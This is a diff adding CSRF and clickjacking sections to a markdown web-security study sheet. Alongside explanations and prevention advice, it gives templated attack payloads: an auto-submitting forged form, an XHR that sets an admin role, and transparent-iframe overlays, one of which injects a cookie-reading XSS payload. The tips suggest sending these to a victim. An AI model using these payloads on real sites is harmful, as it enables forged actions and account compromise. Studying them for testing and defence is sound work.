@@ -315,23 +315,190 @@ CSP or 'Content Security Policy ' is a protection to XSS, clickjacking, code inj
 
 
 ## Cross-site request forgery (CSRF)
-- CSRF vulnerability with no defenses
-- CSRF where token validation depends on request method
-- CSRF where token validation depends on token being present
-- CSRF where token is not tied to user session
-- CSRF where token is tied to non-session cookie
-- CSRF where token is duplicated in cookie
-- CSRF where Referer validation depends on header being present
-- CSRF with broken Referer validation
+
+Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This attack can happend by phishing, clone site, etc ... Conditions have to be present for this attack  to be perform : 
+
+-   **A relevant action.** : Change password, email, rights, ...
+-   **Cookie-based session handling.** : Website with cookie base for sessions are an incredible candidate for this type of attack
+-   **No unpredictable request parameters.** Every element should be known or obtainable to be able to forge the request
+
+Here is a schema to check for CSRF from PATT:
+
+![alt CSRF_Detection](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true)
+
+
+#### Some examples
+
+- No defenses
+ ```html
+	<form method="$method" action="$url">  
+	 <input type="hidden" name="$param1name" value="$param1value">  
+	</form>  
+	<script>  
+	 document.forms\[0\].submit();  
+	</script>
+ ```
+
+-JSon and JS combined
+
+   ```javascript
+	<script>
+	var xhr \= new XMLHttpRequest();
+	xhr.open("POST", "http://www.example.com/api/setrole");
+	xhr.setRequestHeader("Content-Type", "text/plain");
+	//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	//xhr.setRequestHeader("Content-Type", "multipart/form-data");
+	xhr.send('{"role":admin}');
+	</script>
+   ```
+
+#### How to prevent them 
+
+-   Unpredictable with high entropy, as for session tokens in general.
+-   Tied to the user's session.
+-   Strictly validated in every case before the relevant action is executed.
 
 
 ## Clickjacking
 
+Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 
+
+Example (from imperva.com) : 
+1.  The attacker creates an attractive page which promises to give the user a free trip to Tahiti.
+2.  In the background the attacker checks if the user is logged into his banking site and if so, loads the screen that enables transfer of funds, using query parameters to insert the attacker’s bank details into the form.
+3.  The bank transfer page is displayed in an invisible iframe above the free gift page, with the “Confirm Transfer” button exactly aligned over the “Receive Gift” button visible to the user.
+4.  The user visits the page and clicks the “Book My Free Trip” button.
+5.  In reality the user is clicking on the invisible iframe, and has clicked the “Confirm Transfer” button. Funds are transferred to the attacker.
+6.  The user is redirected to a page with information about the free gift (not knowing what happened in the background).
+
+
+![alt CJ example](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/Clickjacking.png.webp)
+
+#### Some examples
+
 - Basic clickjacking with CSRF token protection
+
+	1. Construct a page looking like : 
+
+	```html
+		<style>  
+		 iframe {  
+		 position:relative;  
+		 width:$width\_value;  
+		 height: $height\_value;  
+		 opacity: $opacity;  // Set opacity to make the button transparent
+		 z-index: 2;  
+		 }  
+		 div {  
+		 position:absolute;  
+		 top:$top\_value;  // Change this to fully cover the baiting action
+		 left:$side\_value;  // Change this to fully cover the baiting action
+		 z-index: 1;  
+		 }  
+		</style>  
+		<div>Test me</div>  
+		<iframe src="$url"></iframe>
+	```
+	
+	2. Send the link to the victime and pray
+
+
 - Clickjacking with form input data prefilled from a URL parameter
-- Clickjacking with a frame buster script
+
+	1. Construct a page looking like : 
+		```html
+		<style>  
+		   iframe {  
+			   position:relative;  
+			   width:$width_value;  
+			   height: $height_value;  
+			   opacity: $opacity;  
+			   z-index: 2;  
+		   }  
+		   div {  
+			   position:absolute;  
+			   top:$top_value;  
+			   left:$side_value;  
+			   z-index: 1;  
+		   }  
+		</style>  
+		<div>Test me</div>  
+		<iframe src="$url?email=hacker@attacker-website.com"></iframe>
+		```
+
+	2. Send the link to the victime and pray
+
+
 - Exploiting clickjacking vulnerability to trigger DOM-based XSS
+
+	1. Construct a page looking like:
+	
+	```html
+		<style>  
+	 iframe {  
+	 position:relative;  
+	 width:$width\_value;  
+	 height: $height\_value;  
+	 opacity: $opacity;  
+	 z-index: 2;  
+	 }  
+	 div {  
+	 position:absolute;  
+	 top:$top\_value;  
+	 left:$side\_value;  
+	 z-index: 1;  
+	 }  
+	</style>  
+	<div>Test me</div>  
+	<iframe  
+	src="$url?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+	```
+	
+	2. Send the link to the victime and pray
+	
 - Multistep clickjacking
+
+Just include as much button as you need
+
+```html
+	<style>  
+	 iframe {  
+	 position:relative;  
+	 width:$width\_value;  
+	 height: $height\_value;  
+	 opacity: $opacity;  
+	 z-index: 2;  
+	 }  
+	 .firstClick, .secondClick {  
+	 position:absolute;  
+	 top:$top\_value1;  
+	 left:$side\_value1;  
+	 z-index: 1;  
+	 }  
+	 .secondClick {  
+	 top:$top\_value2;  
+	 left:$side\_value2;  
+	 }  
+	</style>  
+	<div class="firstClick">Test me first</div>  
+	<div class="secondClick">Test me next</div>  
+	<iframe src="$url"></iframe>
+```
+
+
+
+#### How to prevent them 
+
+Two main option are in use to prevend them: 
+
+-	 X-frame-options: 
+	-	 deny : Make the site impossible to include into ifram balise
+	-	 sameorigin: Make ifram only useable on the same website
+	-	 allow-from: Specify URL that can include the website iframe 
+
+-	CSP: You can use a lot of CSP option to restrict page inclusion
+
+
 
 
 ## DOM-based vulnerabilities
